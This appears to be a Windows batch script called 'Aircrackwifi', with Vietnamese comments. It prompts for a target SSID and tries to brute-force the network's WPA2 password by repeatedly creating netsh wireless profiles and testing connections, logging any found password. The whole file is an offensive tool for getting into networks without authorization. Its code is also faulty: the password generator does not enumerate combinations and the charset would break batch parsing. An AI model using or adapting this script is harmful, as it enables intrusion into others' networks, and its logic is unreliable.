@echo off
chcp 65001 >nul
title Aircrackwifi

:: Enable ANSI escape codes
for /f "tokens=*" %%s in ('echo prompt $e ^| cmd') do set "ESC=%%s"

:: Color settings
set "green=%ESC%[32m]"
set "red=%ESC%[31m]"
set "cyan=%ESC%[36m]"
set "yellow=%ESC%[33m]"
set "reset=%ESC%[0m]"

:: Display fancy title with color
echo.
echo  █████╗ ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗    ██╗    ██╗██╗███████╗██╗
echo  ██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝   ██║    ██║██║██╔════╝██║
echo  ███████║██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝    ██║ █╗ ██║██║█████╗  ██║
echo  ██╔══██║██║██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗    ██║███╗██║██║██╔══╝  ██║
echo  ██║  ██║██║██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗   ╚███╔███╔╝██║██║     ██║
echo  ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝
echo.

:: Ask user for SSID (Wi-Fi network name)
echo %yellow%Enter the SSID of the network you want to target (Tên mạng Wi-Fi):%reset%
set /p ssid="SSID: "

:: Create or empty the log files
echo Password attempts > tried_passwords.txt
echo Successful password will be logged here > found_password.txt

:: Define the charset for the password
set charset=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{};:'",.<>?/|\

:: Start the password length from 1 to 18
set min_length=1
set max_length=18
set length=%min_length%

:start_loop
if %length% GTR %max_length% (
    echo %red%[FAILED] Password not found after all attempts.%reset%
    pause
    exit
)

:: Generate brute force passwords with increasing length
echo %yellow%[INFO] Trying passwords with length: %length%%reset%
call :bruteforce %charset% %length%

:: Increase length and try again
set /a length+=1
goto start_loop

:: Brute force password generation (recursive function)
:bruteforce
setlocal EnableDelayedExpansion
set charset=%1
set length=%2

:: Generate all possible passwords with the given charset and length
for /l %%i in (1,1,%length%) do (
    set "pass="
    for %%c in (%charset%) do (
        set "pass=!pass!%%c"
        call :attempt
    )
)
exit /b

:: Attempt to login with a generated password
:attempt
echo %cyan%[ATTEMPT %count%] Trying password: %pass%%reset%
set /a count+=1
echo %pass% >> tried_passwords.txt  :: Log password attempt

:: Tạo file cấu hình Wi-Fi tạm thời với mật khẩu sinh ra
echo Creating Wi-Fi profile with password: %pass%
(
    echo ^<?xml version="1.0"^?^>
    echo ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^>
    echo   ^<name^>%ssid%^</name^>
    echo   ^<SSIDConfig^>
    echo     ^<SSID^>
    echo       ^<name^>%ssid%^</name^>
    echo     ^</SSID^>
    echo   ^</SSIDConfig^>
    echo   ^<connectionType^>ESS^</connectionType^>
    echo   ^<connectionMode^>manual^</connectionMode^>
    echo   ^<MSM^>
    echo     ^<security^>
    echo       ^<authEncryption^>
    echo         ^<authentication^>WPA2PSK^</authentication^>
    echo         ^<encryption^>AES^</encryption^>
    echo         ^<useOneX^>false^</useOneX^>
    echo       ^</authEncryption^>
    echo       ^<sharedKey^>
    echo         ^<keyType^>passPhrase^</keyType^>
    echo         ^<protected^>false^</protected^>
    echo         ^<keyMaterial^>%pass%^</keyMaterial^>
    echo       ^</sharedKey^>
    echo     ^</security^>
    echo   ^</MSM^>
    echo ^</WLANProfile^>
) > "%ssid%-temp.xml"

:: Thử kết nối với mật khẩu đã sinh
netsh wlan add profile filename="%ssid%-temp.xml" >nul 2>&1
netsh wlan connect name="%ssid%" >nul 2>&1

:: Đợi vài giây để kiểm tra kết nối
timeout /t 5 /nobreak >nul

:: Kiểm tra trạng thái kết nối
netsh wlan show interfaces | findstr /i "State" | findstr /i "connected"
if %errorlevel% EQU 0 goto success

:: Xóa file cấu hình tạm thời nếu kết nối thất bại
del "%ssid%-temp.xml" >nul 2>&1
exit /b

:: Nếu kết nối thành công
:success
echo %green%[SUCCESS] Password found: %pass%!%reset%
echo %pass% >> found_password.txt  :: Save successful password
echo Password found! : %pass%
del "%ssid%-temp.xml" >nul 2>&1  :: Xóa file cấu hình tạm thời
pause
exit
